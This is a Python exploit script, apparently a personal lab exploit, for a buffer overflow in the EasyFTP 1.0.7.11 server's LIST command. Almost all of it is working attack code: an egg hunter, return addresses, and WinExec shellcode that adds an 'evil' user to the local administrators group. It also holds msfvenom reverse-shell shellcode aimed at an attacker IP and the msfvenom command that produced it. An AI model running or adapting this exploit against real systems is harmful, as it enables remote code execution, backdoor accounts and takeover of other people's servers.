
#!/usr/bin/python 
import socket
import sys
import struct
#**********************************************
#For educational purposes ONLY!
#Author: T0b0rX0r
#Twitter:@T0b0rX0r
#Source: https://github.com/t0b0rX0r
#Application: EasyFTP 1.0.7.11
#Exploit: Pop Ret (Not SEH), Custom Shell
#KeyWords:Pop RET, Custom Shell, Egg Hunter, WinExec
#Fuzzed: BooFuzz
#**********************************************
host= '192.168.1.178'
port = 21


try:
	s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,port))

except:
	print "socket() failed"
	sys.exit(1)

#badchars \x00\x0a\x2f
badchar = ("\x91\x92\x93\x41\x41\x41\x41\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.163 LPORT=443 -f python -a x86 --platform windows -e x86/shikata_ga_nai
#size 351 bytes
nops="\x20"*3+"\x90"*8
NOP="\x90"*4
buf =  "T00WT00W"+NOP+"\x4c\x4c\x4c"
buf += "\xd9\xc0\xd9\x74\x24\xf4\xba\x31\xbb\x76\x3e\x5e\x29"
buf += "\xc9\xb1\x52\x31\x56\x17\x83\xc6\x04\x03\x67\xa8\x94"
buf += "\xcb\x7b\x26\xda\x34\x83\xb7\xbb\xbd\x66\x86\xfb\xda"
buf += "\xe3\xb9\xcb\xa9\xa1\x35\xa7\xfc\x51\xcd\xc5\x28\x56"
buf += "\x66\x63\x0f\x59\x77\xd8\x73\xf8\xfb\x23\xa0\xda\xc2"
buf += "\xeb\xb5\x1b\x02\x11\x37\x49\xdb\x5d\xea\x7d\x68\x2b"
buf += "\x37\xf6\x22\xbd\x3f\xeb\xf3\xbc\x6e\xba\x88\xe6\xb0"
buf += "\x3d\x5c\x93\xf8\x25\x81\x9e\xb3\xde\x71\x54\x42\x36"
buf += "\x48\x95\xe9\x77\x64\x64\xf3\xb0\x43\x97\x86\xc8\xb7"
buf += "\x2a\x91\x0f\xc5\xf0\x14\x8b\x6d\x72\x8e\x77\x8f\x57"
buf += "\x49\xfc\x83\x1c\x1d\x5a\x80\xa3\xf2\xd1\xbc\x28\xf5"
buf += "\x35\x35\x6a\xd2\x91\x1d\x28\x7b\x80\xfb\x9f\x84\xd2"
buf += "\xa3\x40\x21\x99\x4e\x94\x58\xc0\x06\x59\x51\xfa\xd6"
buf += "\xf5\xe2\x89\xe4\x5a\x59\x05\x45\x12\x47\xd2\xaa\x09"
buf += "\x3f\x4c\x55\xb2\x40\x45\x92\xe6\x10\xfd\x33\x87\xfa"
buf += "\xfd\xbc\x52\xac\xad\x12\x0d\x0d\x1d\xd3\xfd\xe5\x77"
buf += "\xdc\x22\x15\x78\x36\x4b\xbc\x83\xd1\xb4\xe9\x8a\x82"
buf += "\x5d\xe8\x8c\xc5\x26\x65\x6a\xaf\x48\x20\x25\x58\xf0"
buf += "\x69\xbd\xf9\xfd\xa7\xb8\x3a\x75\x44\x3d\xf4\x7e\x21"
buf += "\x2d\x61\x8f\x7c\x0f\x24\x90\xaa\x27\xaa\x03\x31\xb7"
buf += "\xa5\x3f\xee\xe0\xe2\x8e\xe7\x64\x1f\xa8\x51\x9a\xe2"
buf += "\x2c\x99\x1e\x39\x8d\x24\x9f\xcc\xa9\x02\x8f\x08\x31"
buf += "\x0f\xfb\xc4\x64\xd9\x55\xa3\xde\xab\x0f\x7d\x8c\x65"
buf += "\xc7\xf8\xfe\xb5\x91\x04\x2b\x40\x7d\xb4\x82\x15\x82"
buf += "\x79\x43\x92\xfb\x67\xf3\x5d\xd6\x23\x03\x14\x7a\x05"
buf += "\x8c\xf1\xef\x17\xd1\x01\xda\x54\xec\x81\xee\x24\x0b"
buf += "\x99\x9b\x21\x57\x1d\x70\x58\xc8\xc8\x76\xcf\xe9\xd8"

egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" #add jmp esp so its encoded

WinExec = (

"\x33\xc0"                          # XOR EAX,EAX
"\x50"                              # PUSH EAX      => padding for lpCmdLine

"\x68\x61\x64\x64\x20"        #=> PUSH "add "
"\x68\x69\x6c\x20\x2f"        #=> PUSH "il /" verfified
"\x68\x73\x20\x65\x76"        #=> PUSH "s ev" verfified
"\x68\x61\x74\x6f\x72"        #=> PUSH "ator" verfified
"\x68\x69\x73\x74\x72"        #=> PUSH "istr" verfified
"\x68\x64\x6d\x69\x6e"        #=> PUSH "dmin" verfified
"\x68\x75\x70\x20\x61"       # => PUSH "up a" verfified
"\x68\x6c\x67\x72\x6f"        #=> PUSH "lgro" verfified
"\x68\x6c\x6f\x63\x61"        #=> PUSH "loca"  verfified
"\x68\x6E\x65\x74\x20"        #=> PUSH "net "

"\x68\x26\x26\x20\x20"        #=> PUSH "&&   " verfified

"\x68\x61\x64\x64\x20"        #=> PUSH "add "
"\x68\x33\x34\x20\x2F"        #=> PUSH "34 /"
"\x68\x6c\x20\x31\x32"       # => PUSH "l 12" verfified
"\x68\x20\x65\x76\x69"        #=> PUSH " evi" verfified
"\x68\x75\x73\x65\x72"        #=> PUSH "user"
"\x68\x6E\x65\x74\x20"        #=> PUSH "net "

"\x68\x2f\x63\x20\x20"        #=> PUSH "/c  "
"\x68\x65\x78\x65\x20"        #=> PUSH "exe " veriried
"\x68\x63\x6d\x64\x2e"        #=> PUSH "cmd." verified

"\x8B\xC4"                          # MOV EAX,ESP
"\x6A\x01"                          # PUSH 1
"\x50"                              # PUSH EAX
"\xBB\x95\xe6\xdf\x76"              # MOV EBX,kernel32.WinExec
"\xFF\xD3")                         # CALL EBX

# C:\Users\t0b0rx0r\Desktop>arwin.exe kernel32.dll WinExec
# arwin - win32 address resolution program - by steve hanna - v.01
# WinExec is located at 0x76dfe695 in kernel32.dll


unique="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An"
#print len(badchar)
#/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400
pattern_400="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"
#/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 6A413969
#[*] Exact match at offset 268
pattern_268="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8A"
junk = unique + "\x41" * (407- len(unique))
#00417258
seh="\x58\x72\x41\x00"
#junk = "T00WT00W"+"\x90" * (407-4)+seh#"\x42" * 4
#junk = pattern_400
#!mona find -s "\xff\xe4" -cpb -m ftpbasicsvr.exe
jmpesp="\x53\x81\x42\x00" #00428153
#ECX Reg contains 90909090
#!mona find -s "\xff\xd1" -m ftpbasicsvr.exe 
callecx="\x7d\xa9\x41\x00" #0041A97D call ecx
#0x0040325a : pop ecx # retn
popret="\x5a\x32\x40\x00"
stage2="\x41\x41\x41\x41"
#junk="\x90" * (268-12)+stage2+"\x90"*(12-len(stage2))+callecx+"\x43"*(400-268-4)
#junk=pattern_268+callecx+"\x43"*(400-268-4)  #match found at 256

#junk=nops+egghunter+"\x90" * (268-len(egghunter)-len(nops))+popret+"\x43"*(400-268-4-len(WinExec))
DEC="\x4c" * 3  #stack alignment due to ? seen in Olly
junk=nops+egghunter+"\x90" * (268-len(egghunter)-len(nops))+popret+"T00WT00W"+DEC+NOP+WinExec+"\x90"*(400-268-4-len(WinExec)-8)

#junk=badchar+"\x90"*(400-len(badchar))
#2500,1000,100,200,5000,2000,10000 no affect
#5000 stalled app
#500 crash app, seh, no eip
#400 EIP and seh?
#junk = badchar + "\x41" * (407- len(badchar))
#junk="\x90" * 268+"\x41"*4+"\x42"*(407-268-4)
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
print "send user"
s.send('PASS anonymous\r\n')
print "send pass"
s.recv(1024)
#tried nlist,site
#commands=['acct','cwd','smnt','retr','stor','appe','rnfr','rnto','mkd'] 
commands=['mkd'] #only one that seem to be accessible
#for cmd in commands:
	#s.send(cmd+" "+nops+buf+'\r\n')
	#print (cmd+" "+nops+buf+'\r\n')
	#s.recv(1024)

#s.send('mk '+buf+'\r\n')
#s.recv(1024)
s.send('LIST '+junk+'\r\n')  #send crash
print "send list"
s.recv(1024)
s.close()
